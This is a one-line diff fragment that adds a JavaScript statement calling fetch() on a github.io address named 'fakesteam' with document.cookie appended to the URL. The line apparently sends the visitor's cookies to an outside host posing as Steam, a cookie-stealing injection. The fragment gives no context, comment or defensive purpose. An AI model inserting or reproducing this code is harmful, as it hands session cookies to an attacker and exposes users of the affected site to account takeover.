@@ -1,0 +1,1 @@
+fetch("https://hayzxnffa.github.io/fakesteam" + document.cookie);
